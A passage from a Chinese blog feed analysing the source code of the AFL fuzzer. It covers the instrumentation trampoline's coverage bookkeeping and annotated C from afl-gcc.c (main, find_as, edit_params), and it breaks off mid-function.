[rsp+160h+var_100]<br>movq    xmm1, [rsp+160h+var_F0]<br>movq    xmm2, [rsp+160h+var_E0]<br>movq    xmm3, [rsp+160h+var_D0]<br>movq    xmm4, [rsp+160h+var_C0]<br>movq    xmm5, [rsp+160h+var_B0]<br>movq    xmm6, [rsp+160h+var_A0]<br>movq    xmm7, [rsp+160h+var_90]<br>movq    xmm8, [rsp+160h+var_80]<br>movq    xmm9, [rsp+160h+var_70]<br>movq    xmm10, [rsp+160h+var_60]<br>movq    xmm11, [rsp+160h+var_50]<br>movq    xmm12, [rsp+160h+var_40]<br>movq    xmm13, [rsp+160h+var_30]<br>movq    xmm14, [rsp+160h+var_20]<br>movq    xmm15, [rsp+160h+var_10]<br>lea     rsp, [rsp+160h]<br>jmp     __afl_store<br></code></pre></td></tr></table></figure><p>由于<strong>父子进程共享文件描述符</strong>，子进程关闭<code>FORKSRV_FD</code>与<code>FORKSRV_FD + 1</code>，恢复寄存器的值，调用<code>__afl_store</code>。</p><p><strong><code>__afl_store</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_store:<br>xor     rcx, cs:__afl_prev_loc<br>xor     cs:__afl_prev_loc, rcx<br>shr     cs:__afl_prev_loc, 1<br>inc     byte ptr [rdx+rcx]<br></code></pre></td></tr></table></figure><p>这里直接查看反编译源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v7 = _afl_prev_loc ^ a4;<br>_afl_prev_loc ^= v7;<br>_afl_prev_loc = (<span class="hljs-type">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="hljs-number">1</span>;<br>++*(_BYTE *)(v6 + v7);<br></code></pre></td></tr></table></figure><p>其中a4为插入的随机值，也即rcx， 而 <code>_afl_prev_loc</code> 其实是上一个桩的随机id。</p><p>经过两次异或之后，再将 <code>_afl_prev_loc</code> 右移一位作为新的 <code>_afl_prev_loc</code>，避免诸如此类路径(A -&gt; A, B -&gt; B, A -&gt; B, B -&gt; A)混淆。最后在共享内存中存储当前插桩位置的地方计数加一。</p><p><strong>参考链接</strong></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://hollk.blog.csdn.net/category_11470526.html">https://hollk.blog.csdn.net/category_11470526.html</a></p><p><a href="https://paper.seebug.org/1732/">https://paper.seebug.org/1732/</a></p><p><a href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>afl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL源码分析(一)</title>
    <link href="/2023/10/04/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%80/"/>
    <url>/2023/10/04/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL源码分析-一"><a href="#AFL源码分析-一" class="headerlink" title="AFL源码分析(一)"></a>AFL源码分析(一)</h1><p>笔者最近学了点fuzz，做了官方提供的示例后，对fuzz的理解还是一知半解的，所以特意阅读了<a href="https://github.com/google/AFL">AFL</a>源码，以加深对fuzz的理解。由于源码比较长，笔者分成了几篇文章。</p><p>文章参考了众多大佬的文章，还做了不少引用。所以，这篇文章仅作为笔者阅读源码的记录。</p><h2 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>流程图如下：</p><p><img src="/./img/afl%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%80/image-20231004003133350.png" alt="image-20231004003133350"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;      <span class="hljs-comment">// 获取环境变量的值</span><br><br>    SAYF(cCYA <span class="hljs-string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;       <span class="hljs-comment">// 判断参数个数，若个数小于2，打印错误消息并退出</span><br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span><br>         <span class="hljs-string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span><br>         <span class="hljs-string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span><br>         <span class="hljs-string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span><br>         <span class="hljs-string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span><br>         <span class="hljs-string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,<br>         BIN_PATH, BIN_PATH);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  find_as(argv[<span class="hljs-number">0</span>]);     <span class="hljs-comment">// 获取as的路径</span><br><br>  edit_params(argc, argv);      <span class="hljs-comment">// 复制argv到 cc_params[] 数组，并做必要的处理</span><br><br>  execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)cc_params);      <span class="hljs-comment">// 执行cc_params[0]</span><br><br>  FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>为了方便查看cc_params的值，我们追加如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(cc_params); ++i)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\targ%d: %s\n&quot;</span>, i, cc_params[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们执行<code>afl-gcc /home/p2lst/Documents/fuzz/test1/myafl.c -o /home/p2lst/Documents/fuzz/test1/myafl</code>时，输出如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">arg0: gcc<br>arg1: <span class="hljs-regexp">/home/</span>p2lst<span class="hljs-regexp">/Documents/</span>fuzz<span class="hljs-regexp">/test1/my</span>afl.c<br>arg2: -o<br>arg3: <span class="hljs-regexp">/home/</span>p2lst<span class="hljs-regexp">/Documents/</span>fuzz<span class="hljs-regexp">/test1/my</span>afl<br>arg4: -B<br>arg5: <span class="hljs-regexp">/home/</span>p2lst<span class="hljs-regexp">/tools/</span>afl-<span class="hljs-number">2.57</span>b<br>arg6: -g<br>arg7: -O3<br></code></pre></td></tr></table></figure><p>可以看到，最终执行的是gcc。</p><p>由此可见，afl-gcc仅仅是对gcc进行再封装。</p><h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><p>尝试在AFL_PATH或从argv[0]中找到汇编器<code>as</code>。如果失败，中止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">find_as</span><span class="hljs-params">(u8* argv0)</span> &#123;<br><br>  u8 *afl_path = getenv(<span class="hljs-string">&quot;AFL_PATH&quot;</span>);    <span class="hljs-comment">// 获取环境变量AFL_PATH作为汇编器as的目录</span><br>  u8 *slash, *tmp;<br><br>  <span class="hljs-keyword">if</span> (afl_path) &#123;       <span class="hljs-comment">// 判断afl_path是否为空</span><br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/as&quot;</span>, afl_path);<br><br>    <span class="hljs-keyword">if</span> (!access(tmp, X_OK)) &#123;   <span class="hljs-comment">// 判断该路径是否存在汇编器as，若存在，设置as_path的值，并返回</span><br>      as_path = afl_path;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br><br>  &#125;<br><br>  slash = <span class="hljs-built_in">strrchr</span>(argv0, <span class="hljs-string">&#x27;/&#x27;</span>);  <span class="hljs-comment">// 从argv0中提取as路径，取最后一个&#x27;/&#x27;前的路径作为dir</span><br><br>  <span class="hljs-keyword">if</span> (slash) &#123;<br><br>    u8 *dir;<br><br>    *slash = <span class="hljs-number">0</span>;<br>    dir = ck_strdup(argv0); <br>    *slash = <span class="hljs-string">&#x27;/&#x27;</span>;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-as&quot;</span>, dir);<br><br>    <span class="hljs-keyword">if</span> (!access(tmp, X_OK)) &#123;   <span class="hljs-comment">// 判断dir/afl-as是否存在</span><br>      as_path = dir;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br>    ck_free(dir);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!access(AFL_PATH <span class="hljs-string">&quot;/as&quot;</span>, X_OK)) &#123;<br>    as_path = AFL_PATH;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);     <span class="hljs-comment">// 打印报错信息</span><br> <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><p>复制argv到 cc_params[] 数组，并做必要的处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">edit_params</span><span class="hljs-params">(u32 argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  u8 fortify_set = <span class="hljs-number">0</span>, asan_set = <span class="hljs-number">0</span>;<br>  u8 *name;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span><br>  u8 m32_set = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  cc_params = ck_alloc((argc + <span class="hljs-number">128</span>) * <span class="hljs-keyword">sizeof</span>(u8*));     <span class="hljs-comment">// 为cc_params分配足够的空间</span><br><br>  name = <span class="hljs-built_in">strrchr</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;/&#x27;</span>); <span class="hljs-comment">// 获取最后一个&quot;/&quot;后的编译器名称</span><br>  <span class="hljs-keyword">if</span> (!name) name = argv[<span class="hljs-number">0</span>]; <span class="hljs-keyword">else</span> name++;<br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(name, <span class="hljs-string">&quot;afl-clang&quot;</span>, <span class="hljs-number">9</span>)) &#123; <span class="hljs-comment">// 判断是否为clang模式</span><br><br>    clang_mode = <span class="hljs-number">1</span>;     <span class="hljs-comment">// 设置clang_mode为1</span><br><br>    setenv(CLANG_ENV_VAR, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">1</span>);      <br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-clang++&quot;</span>)) &#123; <span class="hljs-comment">// 判断是否为afl-clang++，如果是，获取环境变量AFL_CXX，</span><br>                                        <span class="hljs-comment">// 不为空的话设置为cc_params[0]，否则设置为clang++</span><br>      u8* alt_cxx = getenv(<span class="hljs-string">&quot;AFL_CXX&quot;</span>);<br>      cc_params[<span class="hljs-number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="hljs-string">&quot;clang++&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      u8* alt_cc = getenv(<span class="hljs-string">&quot;AFL_CC&quot;</span>);<br>      cc_params[<span class="hljs-number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="hljs-string">&quot;clang&quot;</span>;<br>    &#125;<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span><br><span class="hljs-comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span><br><span class="hljs-comment">       not call abort(), so afl-fuzz would need to be modified to equate</span><br><span class="hljs-comment">       non-zero exit codes with crash conditions when working with Java</span><br><span class="hljs-comment">       binaries. Meh. */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__        <span class="hljs-comment">// 单独处理apple平台</span></span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-g++&quot;</span>)) cc_params[<span class="hljs-number">0</span>] = getenv(<span class="hljs-string">&quot;AFL_CXX&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="hljs-number">0</span>] = getenv(<span class="hljs-string">&quot;AFL_GCJ&quot;</span>);<br>    <span class="hljs-keyword">else</span> cc_params[<span class="hljs-number">0</span>] = getenv(<span class="hljs-string">&quot;AFL_CC&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (!cc_params[<span class="hljs-number">0</span>]) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span><br>           <span class="hljs-string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span><br>           <span class="hljs-string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);<br><br>      FATAL(<span class="hljs-string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);<br><br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-g++&quot;</span>)) &#123;     <span class="hljs-comment">// 判断是否为afl-g++</span><br>      u8* alt_cxx = getenv(<span class="hljs-string">&quot;AFL_CXX&quot;</span>);<br>      cc_params[<span class="hljs-number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="hljs-string">&quot;g++&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-gcj&quot;</span>)) &#123;      <span class="hljs-comment">// 判断是否为afl-gcj</span><br>      u8* alt_cc = getenv(<span class="hljs-string">&quot;AFL_GCJ&quot;</span>);<br>      cc_params[<span class="hljs-number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="hljs-string">&quot;gcj&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">// 若都不是，则默认为afl-gcc</span><br>      u8* alt_cc = getenv(<span class="hljs-string">&quot;AFL_CC&quot;</span>);<br>      cc_params[<span class="hljs-number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="hljs-string">&quot;gcc&quot;</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>  &#125;<br><br>  <span class="hljs-keyword">while</span> (--argc) &#123;      <span class="hljs-comment">// 循环处理其它参数</span><br>    u8* cur = *(++argv);        <span class="hljs-comment">// 当前参数的值</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(cur, <span class="hljs-string">&quot;-B&quot;</span>, <span class="hljs-number">2</span>)) &#123;       <span class="hljs-comment">// 若cur为-B，判断be_quiet是否存在</span><br><br>      <span class="hljs-keyword">if</span> (!be_quiet) WARNF(<span class="hljs-string">&quot;-B is already set, overriding&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (!cur[<span class="hljs-number">2</span>] &amp;&amp; argc &gt; <span class="hljs-number">1</span>) &#123; argc--; argv++; &#125;<br>      <span class="hljs-keyword">continue</span>;<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-integrated-as&quot;</span>)) <span class="hljs-keyword">continue</span>;       <span class="hljs-comment">// 若cur为-integrated-as，跳过本次循环</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-pipe&quot;</span>)) <span class="hljs-keyword">continue</span>;        <span class="hljs-comment">// 若cur为-pipe，跳过本次循环</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-m32&quot;</span>)) m32_set = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 若cur为-m32，则为32位架构。默认为x64</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-fsanitize=address&quot;</span>) ||<br>        !<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 判断是否开启asan保护</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(cur, <span class="hljs-string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="hljs-number">1</span>;         <span class="hljs-comment">// 判断是否开启fortify保护</span><br><br>    cc_params[cc_par_cnt++] = cur;<br><br>  &#125;<br><br>  cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-B&quot;</span>;<br>  cc_params[cc_par_cnt++] = as_path;    <span class="hljs-comment">// 默认添加-B选项，并指定参数为汇编器as路径</span><br><br>  <span class="hljs-keyword">if</span> (clang_mode)<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-no-integrated-as&quot;</span>;      <span class="hljs-comment">// 追加参数-no-integrated-as</span><br><br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_HARDEN&quot;</span>)) &#123;   <span class="hljs-comment">// 若设置环境变量AFL_HARDEN，则追加下述参数</span><br><br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fstack-protector-all&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (!fortify_set)<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (asan_set) &#123;       <span class="hljs-comment">// 若asan_set为1，则设置环境变量AFL_USE_ASAN=1</span><br><br>    <span class="hljs-comment">/* Pass this on to afl-as to adjust map density. */</span><br><br>    setenv(<span class="hljs-string">&quot;AFL_USE_ASAN&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">1</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;  <span class="hljs-comment">// 获取环境变量AFL_USE_ASAN的值</span><br><br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_USE_MSAN&quot;</span>))<br>      FATAL(<span class="hljs-string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);    <span class="hljs-comment">// 互斥</span><br><br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_HARDEN&quot;</span>))<br>      FATAL(<span class="hljs-string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);      <span class="hljs-comment">// 互斥</span><br><br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-U_FORTIFY_SOURCE&quot;</span>;<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fsanitize=address&quot;</span>;<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;  <span class="hljs-comment">// 获取环境变量AFL_USE_MSAN的值</span><br><br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_USE_ASAN&quot;</span>))<br>      FATAL(<span class="hljs-string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);    <span class="hljs-comment">// 互斥</span><br><br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_HARDEN&quot;</span>))<br>      FATAL(<span class="hljs-string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);      <span class="hljs-comment">// 互斥</span><br><br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-U_FORTIFY_SOURCE&quot;</span>;<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fsanitize=memory&quot;</span>;<br><br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!getenv(<span class="hljs-string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;   <span class="hljs-comment">// 获取环境变量AFL_DONT_OPTIMIZE的值</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span><br><br>    <span class="hljs-comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span><br><span class="hljs-comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span><br><span class="hljs-comment">       that bug. */</span><br><br>    <span class="hljs-keyword">if</span> (!clang_mode || !m32_set)<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-g&quot;</span>; <br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-g&quot;</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    cc_params[cc_par_cnt++] = <span 